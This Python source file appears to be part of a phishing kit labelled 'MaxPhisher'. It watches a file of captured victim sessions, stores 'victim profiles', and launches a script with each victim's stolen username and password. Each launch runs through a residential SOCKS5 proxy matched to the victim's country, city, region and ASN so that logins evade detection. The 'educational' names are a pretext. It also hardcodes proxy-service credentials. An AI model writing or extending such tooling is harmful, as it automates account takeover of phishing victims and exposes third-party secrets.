import asyncio
import concurrent.futures
import json
import logging
import os
import re
import time
import tempfile
import shutil
from pathlib import Path
from typing import Dict, Any, Set
import subprocess
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import threading
from aiohttp import web
import signal
import functools

try:
    import yaml
except ImportError:
    yaml = None  # Optional, for YAML config

# =========================
# CONFIGURATION & STATE
# =========================
CONFIG_FILE = '/home/haymayndz/MaxPhisher/config.json'
STATE_FILE = '/home/haymayndz/MaxPhisher/.master_watcher_state.json'

DEFAULT_CONFIG = {
    "sessions_file": os.path.expanduser("~/.site/sessions.json"),
    "victim_profile_dir": "/tmp/victim_profiles/",
    "analyzer_script": "/home/haymayndz/MaxPhisher/educational_digital_identity_analyzer.py",
    "proxy": {
        "base_user": "ae9bd5562646a8d33a7e",
        "api_key": "5faeb42127544013",
        "gateway": "gw.dataimpulse.com:10000",
        "protocol": "socks5"
    },
    "thread_count": 8,
    "thread_min": 4,
    "thread_max": 16,
    "task_timeout": 120,
    "max_retries": 3,
    "notification": {
        "slack_webhook": None,
        "email": None
    },
    "log_json": True,
    "http_port": 8888
}

CONFIG = dict(DEFAULT_CONFIG)
STATE = {"processed": {}}  # session_id -> num creds processed
STATE_LOCK = threading.Lock()
CONFIG_LOCK = threading.Lock()

# =========================
# LOGGING SETUP
# =========================
class JsonLogFormatter(logging.Formatter):
    def format(self, record):
        log_record = {
            "timestamp": self.formatTime(record, self.datefmt),
            "level": record.levelname,
            "logger": record.name,
            "msg": record.getMessage(),
        }
        if hasattr(record, 'extra'):
            log_record.update(record.extra)
        return json.dumps(log_record)

if DEFAULT_CONFIG["log_json"]:
    handler = logging.StreamHandler()
    handler.setFormatter(JsonLogFormatter())
    logging.basicConfig(level=logging.INFO, handlers=[handler])
else:
    logging.basicConfig(level=logging.INFO,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S')
logger = logging.getLogger('master_watcher_educational')

# =========================
# DYNAMIC SESSIONS FILE DETECTION
# =========================
def get_sessions_file():
    """Auto-detect the active sessions.json file"""
    # Primary: Active runtime directory
    site_dir = os.path.expanduser("~/.site/sessions.json")
    if os.path.exists(site_dir):
        logger.info(f"Using active sessions file: {site_dir}")
        return site_dir
    
    # Fallback: Search in .local_maxsites (for testing)
    maxsites_dir = os.path.join(os.path.dirname(__file__), ".local_maxsites")
    if os.path.exists(maxsites_dir):
        for template_dir in os.listdir(maxsites_dir):
            sessions_path = os.path.join(maxsites_dir, template_dir, "sessions.json")
            if os.path.exists(sessions_path):
                logger.info(f"Found sessions.json in template: {template_dir}")
                return sessions_path
    
    # Default
    logger.info(f"Using default sessions file: {site_dir}")
    return site_dir

# =========================
def load_config():
    global CONFIG
    try:
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
            with CONFIG_LOCK:
                CONFIG.update(data)
            logger.info("Config reloaded.")
    except Exception as e:
        logger.warning(f"Failed to reload config: {e}")

def save_state():
    with STATE_LOCK:
        with open(STATE_FILE, 'w') as f:
            json.dump(STATE, f)

def load_state():
    global STATE
    try:
        with open(STATE_FILE, 'r') as f:
            data = json.load(f)
            with STATE_LOCK:
                STATE = data
    except Exception:
        pass

def clean_param(text):
    if not text:
        return ''
    return re.sub(r'[^a-zA-Z0-9]', '', str(text)).lower()

def build_proxy_string(location: Dict[str, Any]) -> str:
    p = CONFIG["proxy"]
    username_parts = [p["base_user"]]
    if location.get('country'):
        username_parts.append(f"country-{clean_param(location['country'])}")
    if location.get('city'):
        username_parts.append(f"city-{clean_param(location['city'])}")
    if location.get('region'):
        username_parts.append(f"state-{clean_param(location['region'])}")
    if location.get('asn'):
        username_parts.append(f"asn-{clean_param(location['asn'])}")
    formatted_user = "-".join(username_parts)
    return f"{p['protocol']}://{formatted_user}:{p['api_key']}@{p['gateway']}"

def ensure_dir_exists(path: str):
    Path(path).mkdir(parents=True, exist_ok=True)

def notify(event, details):
    # Stub for Slack/email notifications
    logger.info(f"[NOTIFY] {event}: {details}")

# =========================
# MAIN ANALYSIS FUNCTION
# =========================
def analysis_task(session: Dict[str, Any]):
    session_id = session.get('sessionId', 'NO_SESSION_ID')
    credentials = session.get('credentials', [])
    if not credentials:
        logger.warning(f"No credentials found for session {session_id}.")
        return
    cred_entry = credentials[-1]  # Latest credentials
    username = cred_entry.get('username')
    password = cred_entry.get('password')
    location = session.get('location', {})
    proxy = build_proxy_string(location)

    # Add logging for required fields
    if not username or not password:
        logger.error(f"Missing username/password for session {session_id}. Skipping analyzer spawn.")
        return

    # Save session profile
    ensure_dir_exists(CONFIG["victim_profile_dir"])
    profile_path = os.path.join(CONFIG["victim_profile_dir"], f"{session_id}.json")
    with open(profile_path, 'w') as pf:
        json.dump(session, pf, indent=2)

    # Build command with explicit logging
    cmd = [
        'python3', CONFIG["analyzer_script"],
        '--profile', profile_path,
        '--username', username,
        '--password', password,
        '--proxy', proxy
    ]
    logger.info(f"Spawning analyzer for session {session_id} with command: {' '.join(cmd)}")

    for attempt in range(CONFIG["max_retries"]):
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                proc.wait(timeout=CONFIG["task_timeout"])
                logger.info(json.dumps({"event": "analysis_dispatched", "session_id": session_id, "proxy": proxy}))
                notify("analysis_dispatched", f"Session {session_id} analysis dispatched.")
                return
            except subprocess.TimeoutExpired:
                proc.kill()
                logger.warning(json.dumps({"event": "analysis_timeout", "session_id": session_id}))
        except Exception as e:
            logger.error(json.dumps({"event": "analysis_error", "session_id": session_id, "error": str(e)}))
    notify("analysis_failed", f"Session {session_id} failed after {CONFIG['max_retries']} attempts.")

# =========================
# PRODUCER: FILE WATCHER
# =========================
class SessionWatcher(FileSystemEventHandler):
    def __init__(self, filepath: str):
        self.filepath = filepath
        self.processed = STATE["processed"]
        self.lock = threading.Lock()
        self.new_tasks = []

    def on_modified(self, event):
        if event.src_path == self.filepath:
            self.detect_new_credentials()

    def load_sessions(self):
        try:
            with open(self.filepath, 'r') as f:
                data = json.load(f)
                if not isinstance(data, list):
                    logger.error('sessions.json is not a JSON array.')
                    return []
                return data
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON in sessions.json: {e}. Resetting file or checking producer.")
            return []
        except Exception as e:
            logger.error(f"Failed to load sessions.json: {e}")
            return []

    def detect_new_credentials(self):
        with self.lock:
            sessions = self.load_sessions()
            for session in sessions:
                session_id = session.get('sessionId', 'NO_SESSION_ID')
                creds = session.get('credentials', [])
                prev_count = self.processed.get(session_id, 0)
                if len(creds) > prev_count:
                    for idx in range(prev_count, len(creds)):
                        session_copy = dict(session)
                        session_copy['credentials'] = creds[:idx+1]
                        self.new_tasks.append(session_copy)
                    self.processed[session_id] = len(creds)
            save_state()

    def get_new_tasks(self):
        with self.lock:
            tasks = list(self.new_tasks)
            self.new_tasks.clear()
            return tasks

# =========================
# ASYNCIO MAIN EVENT LOOP
# =========================
async def health_handler(request):
    return web.json_response({"status": "ok"})

async def metrics_handler(request):
    # Example metrics
    with STATE_LOCK:
        processed = sum(STATE["processed"].values())
    return web.json_response({"processed_credentials": processed})

async def config_reload_handler(request):
    load_config()
    return web.json_response({"status": "config reloaded"})

async def watcher_main():
    load_config()
    load_state()
    # Use dynamic sessions file detection
    sessions_file = get_sessions_file()
    CONFIG["sessions_file"] = sessions_file
    
    watcher = SessionWatcher(sessions_file)
    observer = Observer()
    observer.schedule(watcher, path=os.path.dirname(CONFIG["sessions_file"]), recursive=False)
    observer.start()

    loop = asyncio.get_running_loop()
    thread_min = CONFIG["thread_min"]
    thread_max = CONFIG["thread_max"]
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["thread_count"])
    logger.info(f"Started master_watcher_educational.py | Threads: {CONFIG['thread_count']}")

    try:
        while True:
            new_tasks = watcher.get_new_tasks()
            backlog = len(new_tasks)
            # Dynamic thread scaling
            if backlog > len(executor._threads) and len(executor._threads) < thread_max:
                executor._max_workers = min(thread_max, len(executor._threads) + 2)
            elif backlog < thread_min and len(executor._threads) > thread_min:
                executor._max_workers = max(thread_min, len(executor._threads) - 2)
            for session in new_tasks:
                loop.run_in_executor(executor, analysis_task, session)
                session_id = session.get('sessionId', 'NO_SESSION_ID')
                logger.info(json.dumps({"event": "task_queued", "session_id": session_id, "new_creds": len(session.get('credentials', []))}))
            await asyncio.sleep(1)
    finally:
        observer.stop()
        observer.join()
        executor.shutdown()

async def start_http_server():
    app = web.Application()
    app.router.add_get('/healthz', health_handler)
    app.router.add_get('/metrics', metrics_handler)
    app.router.add_post('/reload_config', config_reload_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["http_port"])
    await site.start()
    logger.info(f"HTTP health/metrics endpoint running on port {CONFIG['http_port']}")
    while True:
        await asyncio.sleep(3600)

async def main():
    await asyncio.gather(
        watcher_main(),
        start_http_server()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Master watcher terminated by user.")
